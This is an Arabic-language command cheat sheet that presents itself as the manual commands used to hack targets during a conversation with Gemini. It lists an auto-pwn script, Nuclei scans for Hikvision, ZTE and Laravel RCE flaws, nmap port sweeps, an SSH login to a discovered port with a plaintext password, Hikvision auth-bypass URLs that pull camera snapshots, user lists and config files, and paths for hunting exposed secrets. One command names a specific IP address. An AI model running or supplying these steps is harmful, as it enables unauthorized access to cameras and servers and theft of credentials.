# دليل الأوامر التنفيذية (Gemini Manual Commands)

يحتوي هذا الملف على كافة الأوامر اليدوية التي تم استخدامها في رحلة اختراق الأهداف في محادثة Gemini، مقسمة حسب الأداة والهدف.

---

## 0. CVE Intelligence (كاميرا + راوتر — تلقائي)

```bash
# تقرير CVE حسب الموديل والـ firmware (كاميرا أو راوتر)
python tests/test_device_cve.py -H TARGET_IP
python tests/test_device_cve.py -H 188.225.141.236 --user admin --password YOUR_PASS

# FULL AUTO-PWN
bash run.sh   # خيار 2 → bin/auto_pwn.py
```

---

## 1. أوامر فحص Nuclei (المسارات الدقيقة)
استخدم هذه الأوامر عندما تريد فحص ثغرة محددة بعيداً عن البرنامج الآلي:

* **فحص ثغرات Hikvision:**
  ```bash
  bin\nuclei.exe -u "http://TARGET_IP/" -t "http/vulnerabilities/hikvision/"
  ```

* **فحص ثغرة Backdoor محددة (CVE-2017-7921):**
  ```bash
  bin\nuclei.exe -u "http://TARGET_IP/" -t "http/cves/2017/CVE-2017-7921.yaml"
  ```

* **فحص لوحات التحكم المكشوفة (أكثر من 1300 قالب):**
  ```bash
  bin\nuclei.exe -u "http://TARGET_IP/" -t "http/exposed-panels/"
  ```

* **فحص ثغرة Laravel RCE (CVE-2021-3129):**
  ```bash
  bin\nuclei.exe -u http://TARGET_IP:7755 -t http/cves/2021/CVE-2021-3129.yaml
  ```

* **فحص أجهزة ZTE (الراوترات):**
  ```bash
  bin\nuclei.exe -u "http://TARGET_IP/" -t "http/vulnerabilities/zte/"
  ```

---

## 2. أوامر Nmap (الاستطلاع العميق)
الأوامر التي كشفت لنا "الأبواب الخلفية" مثل منفذ 2378:

* **الفحص الشامل لكل المنافذ (بسرعة T4):**
  ```bash
  nmap -p- -T4 TARGET_IP
  ```

* **كشف إصدارات الخدمات ونظام التشغيل (الدقيق):**
  ```bash
  nmap -p- -sV -T4 TARGET_IP
  ```

---

## 3. أوامر الـ SSH (الوصول للسيرفر)
* **الاتصال عبر المنفذ المكتشف (2378):**
  ```bash
  ssh dbadmin@TARGET_IP -p 2378
  ```
  *(كلمة السر المكتشفة: QwEzxc321!@#)*

---

## 4. روابط التجاوز المباشر (Browser Exploits)
هذه الروابط تضعها في المتصفح مباشرة للاستفادة من الثغرة:

* **مشاهدة لقطة حية من الكاميرا:**
  `http://TARGET_IP/onvif-http/snapshot?auth=YWRtaW46MTEK`

* **قائمة المستخدمين (XML):**
  `http://TARGET_IP/Security/users?auth=YWRtaW46MTEK`

* **ملف الإعدادات (مشفر):**
  `http://TARGET_IP/System/configurationFile?auth=YWRtaW46MTEK`

---

## 5. مسارات الفحص اليدوي (Manual Fuzzing)
جرب هذه المسارات خلف الأي بي في المتصفح للبحث عن "صيد ثمين":
* `/.env` (ملف الأسرار)
* `/storage/logs/laravel.log` (سجلات النظام)
* `/admin` (لوحة التحكم)
* `/phpmyadmin` (قاعدة البيانات)
